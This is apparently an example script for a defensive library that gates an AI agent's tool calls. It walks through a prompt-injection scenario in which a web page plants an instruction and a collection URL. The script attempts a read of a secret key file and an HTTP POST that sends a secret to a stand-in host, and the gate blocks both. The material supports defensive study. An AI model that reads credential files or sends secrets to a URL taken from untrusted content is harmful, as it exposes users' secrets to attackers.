"""End-to-end walk-through of the gate.

Scenario: an agent is told to summarize a web page. The fetched page is
untrusted and (in the injection case) carries a hidden instruction plus a sink
URL. We show:

  1. a legitimate in-scope read              -> ALLOW
  2. reading a secret-class path             -> ESCALATE (held -> blocked)
  3. the injection's exfil attempt
     (tainted body -> untrusted-derived URL) -> DENY

Run:  python examples/block_exfil.py
"""
from injection_gate import (
    Capability, CapabilityGrant, PolicyContext, PolicyEngine, Enforcer,
    ActionBlocked, TaintSet, TaintTag, Trust, ExampleToolAdapter,
)


def main():
    # Least-privilege grant for this task: read the project, talk only to our API.
    grant = CapabilityGrant(
        read_roots=["./project"],
        write_roots=["./project/out"],
        egress_allowlist=["api.ourservice.com"],
        exec_allowed=False,
        delete_allowed=False,
    )
    ctx = PolicyContext(grant=grant, sensitive_paths=["./project/.secrets"])

    enforcer = Enforcer(
        PolicyEngine(),                 # default deterministic rules
        ctx,
        audit=lambda r, d: print(f"  audit: {r.capability.value} {r.target} -> "
                                 f"{d.verdict.name} ({d.rule})"),
    )
    tools = ExampleToolAdapter(enforcer)

    trusted = TaintSet.of(TaintTag(Trust.TRUSTED, "user"))
    # Taint produced by fetching an untrusted web page:
    web = TaintSet.of(TaintTag(Trust.UNTRUSTED, "web:somesite.example"))

    print("1) legitimate in-scope read")
    print("   ->", tools.read_file("agent-1", "./project/README.md", taint=trusted))

    print("\n2) read of a secret-class path (escalates, default handler blocks)")
    try:
        tools.read_file("agent-1", "./project/.secrets/key.pem", taint=trusted)
    except ActionBlocked as e:
        print("   BLOCKED:", e)

    print("\n3) injection exfil: tainted data -> URL lifted from the page")
    try:
        tools.http_post(
            "agent-1",
            url="https://somesite.example/collect",   # came out of the page
            body="<the secret the agent was tricked into reading>",
            body_taint=web,                            # data is untrusted-derived
            url_from_untrusted=True,                   # so is the sink
        )
    except ActionBlocked as e:
        print("   BLOCKED:", e)

    print("\nThe gate decided all three without ever asking a model.")


if __name__ == "__main__":
    main()
